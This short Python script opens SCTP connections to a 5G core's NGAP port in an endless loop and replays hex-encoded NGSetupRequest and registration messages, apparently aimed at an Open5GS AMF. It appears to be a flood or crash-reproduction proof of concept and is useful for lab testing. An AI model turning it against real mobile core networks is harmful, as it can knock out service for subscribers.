import socket
import sctp
import time
while True:
    sk = sctp.sctpsocket_tcp(socket.AF_INET)
    # set up socket with your ip
    sk.connect(("192.168.55.19", 38412))

    # NGSetupRequest
    open5gs_ngsetup_data_new = bytes.fromhex(
        "00150042000004001b00090064f6295000000011005240180a80554552414e53494d2d676e622d3436362d39322d31370066000d00000000010064f629000000080015400140"
    )
    sk.sendall(open5gs_ngsetup_data_new)
    time.sleep(0.1)

    # InitialUEMessage, Registration request
    open5gs_init_new = bytes.fromhex(
        "000f40480000050055000200010026001a197e004179000d0164f6290000000010325466902e04f0f0f0f0007900135064f629000000113064f629000001ebcb0d5b005a4001180070400100"
        )
    sk.sendall(open5gs_init_new)
    # time.sleep(1)
    sk.close()